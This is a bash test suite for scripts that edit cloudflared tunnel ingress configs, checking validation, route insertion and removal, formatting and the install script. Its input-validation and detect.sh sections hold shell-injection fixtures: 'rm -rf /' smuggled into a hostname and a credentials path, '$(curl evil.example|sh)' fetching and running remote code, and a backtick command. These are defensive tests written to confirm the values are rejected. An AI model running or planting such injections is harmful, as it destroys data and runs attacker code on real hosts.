#!/usr/bin/env bash
# Self-contained test suite for cloudflare-tunnel-routes scripts.
# Runs entirely on a fixture config; never touches your real /etc/cloudflared.
#
# Usage: bash tests/run-tests.sh
#
# Strategy:
#   - For each test: write a fixture config to a temp dir, set CFTR_CONFIG to
#     point at it, and run the script under test with --dry-run. Compare the
#     "would write" preview against an expected snapshot.
#   - We don't shell out to a real cloudflared, so we stub it with a fake
#     binary on PATH (CFTR_BINARY override).

set -eu
export LC_ALL=C

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
SCRIPTS="$REPO_ROOT/scripts"
PASS=0
FAIL=0

# --- helpers ---------------------------------------------------------------

work_dir=""
fake_bin=""
cleanup() {
    [ -n "$work_dir" ] && rm -rf "$work_dir"
}
trap cleanup EXIT

setup() {
    work_dir="$(mktemp -d)"
    # Stub cloudflared: prints args, exits 0 - so DNS + validate are no-ops.
    fake_bin="$work_dir/cloudflared"
    cat > "$fake_bin" <<'STUB'
#!/usr/bin/env bash
echo "[stub-cloudflared] $*"
exit 0
STUB
    chmod +x "$fake_bin"
}

write_fixture() {
    cat > "$work_dir/config.yml"
}

assert_eq() {
    local name="$1" expected="$2" actual="$3"
    if [ "$expected" = "$actual" ]; then
        printf '  PASS  %s\n' "$name"
        PASS=$((PASS + 1))
    else
        printf '  FAIL  %s\n' "$name" >&2
        printf '    expected: %s\n' "$expected" >&2
        printf '    actual:   %s\n' "$actual" >&2
        FAIL=$((FAIL + 1))
    fi
}

assert_contains() {
    local name="$1" needle="$2" hay="$3"
    if printf '%s' "$hay" | grep -qF -- "$needle"; then
        printf '  PASS  %s\n' "$name"
        PASS=$((PASS + 1))
    else
        printf '  FAIL  %s\n' "$name" >&2
        printf '    expected to contain: %s\n' "$needle" >&2
        printf '    actual:\n%s\n' "$hay" >&2
        FAIL=$((FAIL + 1))
    fi
}

assert_not_contains() {
    local name="$1" needle="$2" hay="$3"
    if printf '%s' "$hay" | grep -qF -- "$needle"; then
        printf '  FAIL  %s\n' "$name" >&2
        printf '    expected NOT to contain: %s\n' "$needle" >&2
        FAIL=$((FAIL + 1))
    else
        printf '  PASS  %s\n' "$name"
        PASS=$((PASS + 1))
    fi
}

assert_exit_nonzero() {
    local name="$1" rc="$2"
    if [ "$rc" -ne 0 ]; then
        printf '  PASS  %s\n' "$name"
        PASS=$((PASS + 1))
    else
        printf '  FAIL  %s (expected non-zero exit, got %s)\n' "$name" "$rc" >&2
        FAIL=$((FAIL + 1))
    fi
}

run_add() {
    CFTR_CONFIG="$work_dir/config.yml" CFTR_BINARY="$fake_bin" \
        bash "$SCRIPTS/add-route.sh" "$@" 2>&1
}

run_remove() {
    CFTR_CONFIG="$work_dir/config.yml" CFTR_BINARY="$fake_bin" \
        bash "$SCRIPTS/remove-route.sh" "$@" 2>&1
}

run_list() {
    CFTR_CONFIG="$work_dir/config.yml" CFTR_BINARY="$fake_bin" \
        bash "$SCRIPTS/list-routes.sh" 2>&1
}

run_detect() {
    CFTR_CONFIG="$work_dir/config.yml" CFTR_BINARY="$fake_bin" \
        bash "$SCRIPTS/detect.sh" 2>&1
}

# --- tests -----------------------------------------------------------------

echo
echo "=== input validation ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - service: http_status:404
EOF
out="$(run_add 'evil"; rm -rf /' 8080 --dry-run || true)"
assert_contains "rejects hostname with quote+semicolon" "invalid hostname" "$out"

out="$(run_add 'app.example.com' 99999 --dry-run || true)"
assert_contains "rejects out-of-range port" "port out of range" "$out"

out="$(run_add 'app.example.com' 8080 --path 'no-leading-slash' --dry-run || true)"
assert_contains "rejects path without /" "must start with /" "$out"

out="$(run_add 'app.example.com' 8080 --path '/has space' --dry-run || true)"
assert_contains "rejects path with whitespace" "invalid --path" "$out"

out="$(run_add 'app.example.com' 8080 --path '/has:colon' --dry-run || true)"
assert_contains "rejects path with colon" "invalid --path" "$out"

# Path with regex glob chars must be ACCEPTED (cloudflared treats path: as Go regex)
out="$(run_add 'app.example.com' 8080 --path '/docs.*' --dry-run || true)"
assert_contains "accepts glob path /docs.*" "path: /docs.*" "$out"

out="$(run_add 'app.example.com' 8080 --path '/api/v[12]/.*' --dry-run || true)"
assert_contains "accepts regex path with brackets" "path: /api/v[12]/.*" "$out"

echo
echo "=== add-route: insertion behavior ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - service: http_status:404
EOF
out="$(run_add 'app.example.com' 8080 --dry-run)"
assert_contains "preview shows new hostname" "hostname: app.example.com" "$out"
assert_contains "preview shows port-derived service" "service: http://127.0.0.1:8080" "$out"
assert_contains "preview keeps catch-all" "service: http_status:404" "$out"

# Idempotency: adding the same hostname again should detect duplicate
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: app.example.com
    service: http://127.0.0.1:8080
  - service: http_status:404
EOF
out="$(run_add 'app.example.com' 8080 --dry-run)"
assert_contains "detects existing hostname (no path)" "already exists" "$out"

# Add with path=/v1, then re-adding with same path is a duplicate, but with
# a different path it should NOT be a duplicate.
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: api.example.com
    path: /v1
    service: http://127.0.0.1:9000
  - service: http_status:404
EOF
out="$(run_add 'api.example.com' 9000 --path '/v1' --dry-run)"
assert_contains "same hostname+path is duplicate" "already exists" "$out"

out="$(run_add 'api.example.com' 9001 --path '/v2' --dry-run)"
assert_not_contains "same hostname different path is NOT duplicate" "already exists" "$out"
assert_contains "shows new path block" "path: /v2" "$out"

echo
echo "=== add-route: catch-all sanity ==="
setup
# Config without a catch-all: must refuse, otherwise insertion would silently no-op
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: foo.example.com
    service: http://127.0.0.1:9000
EOF
rc=0
out="$(run_add 'app.example.com' 8080 --dry-run)" || rc=$?
assert_exit_nonzero "missing catch-all -> error" "$rc"
assert_contains "missing catch-all message" "found 0" "$out"

# Config with two catch-alls: must also refuse (would duplicate the new block)
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - service: http_status:404
  - service: http_status:404
EOF
rc=0
out="$(run_add 'app.example.com' 8080 --dry-run)" || rc=$?
assert_exit_nonzero "duplicate catch-all -> error" "$rc"
assert_contains "duplicate catch-all message" "found 2" "$out"

echo
echo "=== remove-route: removes correct block, keeps catch-all ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: keep.example.com
    service: http://localhost:9000
  - hostname: drop.example.com
    service: http://localhost:8000
  - service: http_status:404
EOF
out="$(run_remove 'drop.example.com' --dry-run)"
assert_contains "keeps unrelated hostname" "hostname: keep.example.com" "$out"
assert_not_contains "removes target hostname" "hostname: drop.example.com" "$out"
assert_contains "preserves catch-all" "service: http_status:404" "$out"

# Remove non-existent -> no change
out="$(run_remove 'missing.example.com' --dry-run)"
assert_contains "missing entry reports unchanged" "no matching entry" "$out"

echo
echo "=== detect.sh: env override ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - service: http_status:404
EOF
out="$(run_detect)"
assert_contains "detect uses CFTR_CONFIG" "config=$work_dir/config.yml" "$out"
assert_contains "detect uses CFTR_BINARY" "binary=$fake_bin" "$out"
assert_contains "detect extracts tunnel_id" "tunnel_id=11111111-2222-3333-4444-555555555555" "$out"

# Tampered config must be rejected by detect.sh validation
write_fixture <<'EOF'
tunnel: $(curl evil.example|sh)
credentials-file: /tmp/x.json
ingress:
  - service: http_status:404
EOF
rc=0
out="$(run_detect)" || rc=$?
assert_exit_nonzero "rejects shell-injection in tunnel_id" "$rc"
assert_contains "complains about suspicious value" "refusing to emit" "$out"

# Backtick variant
write_fixture <<'EOF'
tunnel: `id > /tmp/pwn`
credentials-file: /tmp/x.json
ingress:
  - service: http_status:404
EOF
rc=0
out="$(run_detect)" || rc=$?
assert_exit_nonzero "rejects backtick injection in tunnel_id" "$rc"

# Path-injection via credentials-file
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: $(rm -rf /)
ingress:
  - service: http_status:404
EOF
rc=0
out="$(run_detect)" || rc=$?
assert_exit_nonzero "rejects shell-injection in credentials path" "$rc"

echo
echo "=== add-route: argv injection / unknown args ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - service: http_status:404
EOF
rc=0
out="$(run_add 'app.example.com' 8080 --bogus 2>&1)" || rc=$?
assert_exit_nonzero "rejects unknown CLI flag" "$rc"
assert_contains "unknown flag message" "Unknown argument" "$out"

# Missing positional args
rc=0
out="$(run_add 2>&1)" || rc=$?
assert_exit_nonzero "rejects missing args" "$rc"
assert_contains "shows usage when no args" "Usage:" "$out"

echo
echo "=== add-route: target normalization ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - service: http_status:404
EOF
out="$(run_add 'app.example.com' 'http://localhost:9000' --dry-run)"
assert_contains "accepts http URL target" "service: http://localhost:9000" "$out"

out="$(run_add 'app.example.com' 'https://internal.svc:8443' --dry-run)"
assert_contains "accepts https URL target" "service: https://internal.svc:8443" "$out"

out="$(run_add 'app.example.com' 'host.local:1234' --dry-run)"
assert_contains "accepts host:port target" "service: http://host.local:1234" "$out"

rc=0
out="$(run_add 'app.example.com' 'just-text' --dry-run 2>&1)" || rc=$?
assert_exit_nonzero "rejects bare text target" "$rc"

echo
echo "=== list-routes: yq path vs awk fallback ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: simple.example.com
    service: http://localhost:9000
  - hostname: api.example.com
    path: /v1
    service: http://localhost:8080
  - service: http_status:404
EOF

# awk fallback (force by clearing PATH of any yq)
out="$(PATH="$(getconf PATH 2>/dev/null || echo '/usr/bin:/bin')" run_list)"
assert_contains "awk fallback shows simple hostname" "simple.example.com" "$out"
assert_contains "awk fallback shows hostname+path" "api.example.com" "$out"
assert_contains "awk fallback shows path column" "/v1" "$out"

# yq path - only run if /tmp/yq is available (test scaffolding can install it)
if [ -x /tmp/yq ]; then
    out="$(PATH="/tmp:$PATH" run_list)"
    assert_contains "yq path shows simple hostname" "simple.example.com" "$out"
    assert_contains "yq path shows api with path" "/v1" "$out"
    # yq path correctly surfaces the catch-all (awk fallback misses it)
    assert_contains "yq path surfaces catch-all" "http_status:404" "$out"
else
    echo "  SKIP  yq not at /tmp/yq - download it to enable yq-path tests"
fi

# YAML with quoted strings + inline comments
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: "quoted.example.com"
    path: '/api/v[12]/.*'
    service: "http://localhost:8080"   # inline comment
  - service: http_status:404
EOF
if [ -x /tmp/yq ]; then
    out="$(PATH="/tmp:$PATH" run_list)"
    assert_contains "yq strips quotes from hostname" "quoted.example.com" "$out"
    assert_contains "yq keeps regex path intact" "/api/v[12]/.*" "$out"
    # The inline comment must NOT leak into the service column
    assert_not_contains "yq excludes inline comment" "inline comment" "$out"
fi

echo
echo "=== complex YAML edits with awk path ==="
# Mixed entries: hostname-only, hostname+path, multiple paths same hostname
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: example.com
    path: /v1
    service: http://localhost:8001
  - hostname: example.com
    path: /v2
    service: http://localhost:8002
  - hostname: example.com
    service: http://localhost:8000
  - service: http_status:404
EOF
# Without --path, ALL entries for the hostname are dropped (catch-all stays)
out="$(run_remove 'example.com' --dry-run)"
assert_not_contains "remove w/o --path drops v1" "service: http://localhost:8001" "$out"
assert_not_contains "remove w/o --path drops v2" "service: http://localhost:8002" "$out"
assert_not_contains "remove w/o --path drops no-path" "service: http://localhost:8000" "$out"
assert_contains "remove w/o --path keeps catch-all" "http_status:404" "$out"

# With --path /v1, only that block is removed; the rest stay
out="$(run_remove 'example.com' --path '/v1' --dry-run)"
assert_contains    "remove --path /v1 keeps /v2 block" "path: /v2" "$out"
assert_not_contains "remove --path /v1 drops /v1 block" "path: /v1" "$out"
assert_contains    "remove --path /v1 keeps no-path entry" "service: http://localhost:8000" "$out"

echo
echo "=== formatting: indent matches existing config ==="
setup
# Canonical 2-space indent (the shape cloudflared writes itself)
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: existing.example.com
    service: http://localhost:9000
  - service: http_status:404
EOF
out="$(run_add app.example.com 8080 --dry-run)"
assert_contains "2-space catch-all -> 2-space new block" '  - hostname: app.example.com' "$out"
assert_contains "2-space new block keeps service indent" '    service: http://127.0.0.1:8080' "$out"

# Zero-indent variant (also valid YAML; some hand-crafted configs use it)
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
- hostname: existing.example.com
  service: http://localhost:9000
- service: http_status:404
EOF
out="$(run_add app.example.com 8080 --dry-run)"
# Verify there's a hostname line that starts with NO indent (zero-indent style)
if printf '%s\n' "$out" | grep -qE '^- hostname: app\.example\.com$'; then
    printf '  PASS  0-space catch-all -> 0-space new block\n'; PASS=$((PASS + 1))
else
    printf '  FAIL  0-space catch-all -> 0-space new block\n' >&2; FAIL=$((FAIL + 1))
fi
# And the new block has NO 2-space-indented hostname line
if printf '%s\n' "$out" | grep -qE '^  - hostname: app\.example\.com$'; then
    printf '  FAIL  0-space variant has no 2-indent line\n' >&2; FAIL=$((FAIL + 1))
else
    printf '  PASS  0-space variant has no 2-indent line\n'; PASS=$((PASS + 1))
fi

echo
echo "=== formatting: comments between routes are preserved ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  # this comment marks the legacy v1 endpoint
  - hostname: legacy.example.com
    service: http://localhost:8000
  # added in 2025 sprint planning
  - hostname: api.example.com
    path: /v1
    service: http://localhost:9000
  - service: http_status:404
EOF
out="$(run_add new.example.com 7000 --dry-run)"
assert_contains "preserves first inline comment" "this comment marks" "$out"
assert_contains "preserves second inline comment" "added in 2025" "$out"
assert_contains "still inserts new hostname" "hostname: new.example.com" "$out"

# remove-route must leave comments alone
out="$(run_remove legacy.example.com --dry-run)"
assert_contains "remove keeps the OTHER comment" "added in 2025" "$out"
assert_not_contains "remove drops legacy hostname" "hostname: legacy.example.com" "$out"

echo
echo "=== formatting: quoted hostname / service / path round-trip ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: "quoted.example.com"
    service: 'http://localhost:9000'
  - hostname: regex.example.com
    path: '/api/v[12]/.*'
    service: "http://localhost:8080"
  - service: http_status:404
EOF
# add another route and make sure the quoted neighbors survive verbatim
out="$(run_add new.example.com 7000 --dry-run)"
assert_contains "preserves double-quoted hostname" '"quoted.example.com"' "$out"
assert_contains "preserves single-quoted service" "'http://localhost:9000'" "$out"
assert_contains "preserves quoted regex path" "'/api/v[12]/.*'" "$out"

# remove a non-quoted neighbor and verify quoted lines survive
out="$(run_remove regex.example.com --dry-run)"
assert_contains "remove keeps quoted hostname" '"quoted.example.com"' "$out"

echo
echo "=== formatting: --comment opt-in ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - service: http_status:404
EOF
out="$(run_add app.example.com 8080 --comment "Gradio demo" --dry-run)"
assert_contains "comment header rendered" "# Added by cloudflare-tunnel-routes" "$out"
assert_contains "comment text included" "Gradio demo" "$out"
assert_contains "comment ISO date included" "$(date +%Y-%m-%d)" "$out"

# Without --comment, no comment is added
out="$(run_add app.example.com 8080 --dry-run)"
assert_not_contains "no comment header without --comment" "# Added by cloudflare-tunnel-routes" "$out"

# Reject newline in comment
rc=0
out="$(run_add app.example.com 8080 --comment "$(printf 'a\nb')" --dry-run 2>&1)" || rc=$?
assert_exit_nonzero "rejects newline in --comment" "$rc"
assert_contains "newline-in-comment message" "newlines" "$out"

# Reject overlong comment
rc=0
long="$(printf 'x%.0s' {1..201})"
out="$(run_add app.example.com 8080 --comment "$long" --dry-run 2>&1)" || rc=$?
assert_exit_nonzero "rejects overlong --comment" "$rc"

echo
echo "=== formatting: hand-crafted exotic configs ==="
setup
# Tab indentation - hand-crafted, awk patterns assume spaces. The sanity
# check at minimum should refuse with a clear error rather than silently
# corrupt the file.
printf 'tunnel: 11111111-2222-3333-4444-555555555555\ncredentials-file: /tmp/x.json\ningress:\n\t- hostname: tabby.example.com\n\t  service: http://localhost:9000\n\t- service: http_status:404\n' > "$work_dir/config.yml"
rc=0
out="$(run_add app.example.com 8080 --dry-run 2>&1)" || rc=$?
# Either the catch-all sanity check refuses (preferred) or it accepts and
# inserts a space-indented block. Both are acceptable; what we want to
# rule out is "silently produces a corrupt file". Validate that one of
# these two clear paths runs.
if [ "$rc" -ne 0 ]; then
    assert_contains "tab config refused with clear error" "found 0" "$out"
else
    # Accepted - then the diff must show our new block (proof that the
    # awk step ran, not a silent no-op).
    assert_contains "tab config accepted, block inserted" "hostname: app.example.com" "$out"
fi

echo
echo "=== install.sh edge cases ==="
# install.sh creates a symlink in $HOME/.claude/skills/. Run it in an isolated
# fake HOME so the real ~/.claude/skills/ directory is untouched.
fake_home="$(mktemp -d)"
out="$(HOME="$fake_home" bash "$REPO_ROOT/install.sh" 2>&1)"
[ -L "$fake_home/.claude/skills/cloudflare-tunnel-routes" ] && {
    printf '  PASS  install.sh creates symlink\n'; PASS=$((PASS+1))
} || {
    printf '  FAIL  install.sh did not create symlink\n' >&2
    FAIL=$((FAIL+1))
}

# Re-running should be idempotent (replaces the symlink)
HOME="$fake_home" bash "$REPO_ROOT/install.sh" >/dev/null 2>&1
[ -L "$fake_home/.claude/skills/cloudflare-tunnel-routes" ] && {
    printf '  PASS  install.sh is idempotent on existing symlink\n'; PASS=$((PASS+1))
} || {
    printf '  FAIL  install.sh broke its own symlink\n' >&2
    FAIL=$((FAIL+1))
}

# If a regular file sits at TARGET_DIR, install.sh must refuse with a clear error
rm -f "$fake_home/.claude/skills/cloudflare-tunnel-routes"
mkdir -p "$fake_home/.claude/skills"
echo "i was here first" > "$fake_home/.claude/skills/cloudflare-tunnel-routes"
rc=0
out="$(HOME="$fake_home" bash "$REPO_ROOT/install.sh" 2>&1)" || rc=$?
assert_exit_nonzero "install.sh refuses to clobber regular file" "$rc"
assert_contains "install.sh names the conflicting file" "regular file" "$out"
rm -rf "$fake_home"

# --- summary ---------------------------------------------------------------

echo
echo "=========================="
printf "PASS: %d\nFAIL: %d\n" "$PASS" "$FAIL"
echo "=========================="
[ "$FAIL" -eq 0 ]
